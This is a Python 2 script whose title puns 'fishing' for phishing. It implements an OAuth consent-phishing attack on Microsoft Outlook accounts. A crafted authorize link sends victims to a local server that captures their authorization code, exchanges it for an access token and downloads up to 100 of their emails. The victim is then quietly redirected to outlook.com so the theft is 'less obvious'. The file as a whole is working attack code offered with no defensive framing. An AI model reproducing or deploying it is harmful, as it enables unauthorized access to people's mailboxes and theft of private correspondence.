# Fishing outlook resources
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
from SocketServer import ThreadingMixIn
import requests 
from urlparse import parse_qs, urlparse
import threading
import time, thread
import json, logging, sys

# debug mode
logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)

# constants 
app_id = ""
pass_key = ""
redirect_url = "http://localhost/api/outlook/oauth"
token_request_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token" 
phishing_url = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&redirect_uri={0}&client_id={1}".format(redirect_url, app_id)
scope = 'https://outlook.office.com/mail.read'
mail_api = "https://outlook.office.com/api/v2.0/me/messages?$top=100" # this should get all the emails. 

def get_access_code(code):
    data = {}
    data['code'] = code 
    data['redirect_uri'] = redirect_url 
    data['client_id'] = app_id
    data['scope'] = scope 
    data['grant_type'] = 'authorization_code'
    logging.debug(data)
    headers = {}
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    info = json.loads(requests.post(token_request_url, data, headers).text) 
    logging.debug(json.dumps(info, ensure_ascii=False))
    return info 

def fetch_email(info):
    token_type = info['token_type'] 
    access_token = info['access_token']
    # request the mail api
    emails = json.loads(requests.get(mail_api,headers={"Authorization":token_type + " " + access_token}).text)
    logging.debug(json.dumps(emails, ensure_ascii=False))
    # write to a file 
    
def refresh_token(refresh_token):
    """ do this once in a while? """
    data = {}
    data['grant_type'] = "refresh_token"
    data['redirect_uri'] = redirect_url
    data['client_id'] = app_id
    # secret?
    data['refresh_token'] = refresh_token 
    data['scope'] = scope

class S(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            path = urlparse(self.path) 
            logging.debug("[*] self.path: " + path.query)
            code = parse_qs(path.query)['code'][0] # the path to our host 
            logging.debug("[+] code: " + code)
            access_token = get_access_code(code)
            thread.start_new_thread(fetch_email, (access_token,))
        except KeyError:
            logging.debug("[-] Failed to get code")
            pass # whats going on?
        # just redirect to email page. Less obvious :)
        self.send_response(302)
        self.send_header('Location', 'https://www.outlook.com/')
        self.end_headers()

    def do_POST(self):
        """ parse POST request here, should never happen """

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """ handle requests """
    pass

def run(server_class=HTTPServer, handler_class=S, port=80):
    httpd = ThreadedHTTPServer(('', port), handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
